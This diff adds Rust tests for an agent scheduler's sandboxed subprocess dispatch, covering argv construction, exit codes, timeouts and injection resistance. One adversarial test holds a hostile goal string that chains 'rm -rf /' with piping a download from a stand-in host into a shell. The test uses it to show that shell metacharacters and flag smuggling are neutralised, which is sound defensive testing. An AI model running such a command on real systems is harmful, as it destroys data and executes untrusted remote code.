@@ -337,3 +337,198 @@ async fn boundary_max_concurrent_zero_unbounded() {
     assert_eq!(fired, 3);
     assert_eq!(rec.lock().unwrap().len(), 3);
 }
+
+// ── scheduler S2b — sandboxed subprocess dispatch ──
+
+/// A sandbox double that records every `ExecSpec` and returns a canned result, so a
+/// test can assert the argv / network / env the driver dispatches, without spawning
+/// a real process (pattern: `agent-git/src/cli.rs` RecordingSandbox).
+struct RecordingSandbox {
+    calls: Arc<Mutex<Vec<agent_core::ExecSpec>>>,
+    result: Result<agent_core::ExecOutput, ()>,
+}
+impl RecordingSandbox {
+    fn returning(out: agent_core::ExecOutput) -> Self {
+        Self {
+            calls: Arc::new(Mutex::new(Vec::new())),
+            result: Ok(out),
+        }
+    }
+    fn failing() -> Self {
+        Self {
+            calls: Arc::new(Mutex::new(Vec::new())),
+            result: Err(()),
+        }
+    }
+    fn last(&self) -> agent_core::ExecSpec {
+        self.calls.lock().unwrap().last().cloned().expect("a call")
+    }
+    fn call_count(&self) -> usize {
+        self.calls.lock().unwrap().len()
+    }
+}
+#[async_trait::async_trait]
+impl agent_core::Sandbox for RecordingSandbox {
+    async fn exec(
+        &self,
+        spec: &agent_core::ExecSpec,
+    ) -> agent_core::Result<agent_core::ExecOutput> {
+        self.calls.lock().unwrap().push(spec.clone());
+        self.result
+            .clone()
+            .map_err(|()| agent_core::Error::Sandbox("sandbox down".into()))
+    }
+    fn capabilities(&self) -> agent_core::SandboxCapabilities {
+        agent_core::SandboxCapabilities::default()
+    }
+}
+
+fn exit_output(code: i32, stdout: &str, stderr: &str) -> agent_core::ExecOutput {
+    agent_core::ExecOutput {
+        stdout: stdout.into(),
+        stdout_bytes: stdout.as_bytes().to_vec(),
+        stderr: stderr.into(),
+        exit_code: code,
+        timed_out: false,
+    }
+}
+
+// desc: a fired job is dispatched as `agent --config … --run-scheduled-job --tenant T
+// <goal>` under the sandbox, network On + env Inherit; exit 0 → the stdout answer.
+#[tokio::test]
+async fn positive_dispatches_subprocess_with_tenant_argv() {
+    let sb = Arc::new(RecordingSandbox::returning(exit_output(0, "done", "")));
+    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
+    let out = super::dispatch_subprocess(
+        &dyn_sb,
+        std::path::Path::new("/opt/agent"),
+        "config/agent.toml",
+        3600,
+        "acme",
+        "run the daily digest",
+    )
+    .await;
+    assert_eq!(out.unwrap(), "done");
+    let spec = sb.last();
+    assert_eq!(
+        spec.argv,
+        vec![
+            "/opt/agent".to_string(),
+            "--config".to_string(),
+            "config/agent.toml".to_string(),
+            "--run-scheduled-job".to_string(),
+            "--tenant".to_string(),
+            "acme".to_string(),
+            "--".to_string(),
+            "run the daily digest".to_string(),
+        ]
+    );
+    assert_eq!(spec.network, agent_core::NetworkPolicy::On);
+    assert_eq!(spec.env, agent_core::EnvPolicy::Inherit);
+    assert_eq!(spec.timeout_secs, 3600);
+}
+
+// desc (negative): a non-zero child exit becomes a Failed run carrying the code + stderr.
+#[tokio::test]
+async fn negative_nonzero_exit_recorded_failed() {
+    let sb = Arc::new(RecordingSandbox::returning(exit_output(2, "", "kaboom")));
+    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
+    let out =
+        super::dispatch_subprocess(&dyn_sb, std::path::Path::new("/a"), "c.toml", 60, "t", "g")
+            .await;
+    let err = out.unwrap_err().to_string();
+    assert!(err.contains("exited 2"), "{err}");
+    assert!(err.contains("kaboom"), "{err}");
+}
+
+// desc (boundary): a timed-out child is a Failed run naming the timeout.
+#[tokio::test]
+async fn boundary_timeout_recorded_failed() {
+    let timed_out = agent_core::ExecOutput {
+        timed_out: true,
+        ..exit_output(0, "", "")
+    };
+    let sb = Arc::new(RecordingSandbox::returning(timed_out));
+    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
+    let out =
+        super::dispatch_subprocess(&dyn_sb, std::path::Path::new("/a"), "c.toml", 30, "t", "g")
+            .await;
+    assert!(out.unwrap_err().to_string().contains("timed out"));
+}
+
+// desc (corner): a sandbox exec error propagates (the job is Failed, not silently ok).
+#[tokio::test]
+async fn corner_sandbox_error_propagates() {
+    let sb = Arc::new(RecordingSandbox::failing());
+    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
+    let out =
+        super::dispatch_subprocess(&dyn_sb, std::path::Path::new("/a"), "c.toml", 60, "t", "g")
+            .await;
+    assert!(out.is_err());
+    assert_eq!(sb.call_count(), 1, "the sandbox was invoked exactly once");
+}
+
+// desc (adversarial): a hostile goal is passed as ONE argv element — argv mode means
+// no shell, so `; rm -rf /` and friends can never be word-split or interpreted.
+#[tokio::test]
+async fn adversarial_goal_passed_as_single_argv_no_shell() {
+    let sb = Arc::new(RecordingSandbox::returning(exit_output(0, "ok", "")));
+    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
+    let hostile = "x; rm -rf / && curl evil.example | sh # $(whoami)";
+    let _ = super::dispatch_subprocess(
+        &dyn_sb,
+        std::path::Path::new("/a"),
+        "c.toml",
+        60,
+        "acme",
+        hostile,
+    )
+    .await;
+    let spec = sb.last();
+    assert_eq!(spec.argv.len(), 8, "no extra tokens: {:?}", spec.argv);
+    assert_eq!(
+        spec.argv.last().unwrap(),
+        hostile,
+        "the whole goal is one argv element, verbatim"
+    );
+    assert_eq!(
+        spec.argv[spec.argv.len() - 2],
+        "--",
+        "a `--` end-of-options separator precedes the untrusted goal"
+    );
+    assert!(
+        spec.command.is_empty(),
+        "argv mode: the shell `command` field is unused"
+    );
+}
+
+// desc (adversarial): a flag-like goal passed after `--` reaches the argv verbatim,
+// never split off a leading `--tenant`/flag token — the separator neutralises argv
+// flag smuggling into the child.
+#[tokio::test]
+async fn adversarial_flag_like_goal_is_after_separator() {
+    let sb = Arc::new(RecordingSandbox::returning(exit_output(0, "ok", "")));
+    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
+    let _ = super::dispatch_subprocess(
+        &dyn_sb,
+        std::path::Path::new("/a"),
+        "c.toml",
+        60,
+        "acme",
+        "--serve-mcp",
+    )
+    .await;
+    let spec = sb.last();
+    let sep = spec
+        .argv
+        .iter()
+        .position(|a| a == "--")
+        .expect("a -- separator");
+    assert_eq!(
+        &spec.argv[sep + 1..],
+        &["--serve-mcp".to_string()],
+        "the flag-like goal sits after `--`, so the child treats it as a positional"
+    );
+    // And `--tenant` appears exactly once (the real one), never smuggled by the goal.
+    assert_eq!(spec.argv.iter().filter(|a| *a == "--tenant").count(), 1);
+}
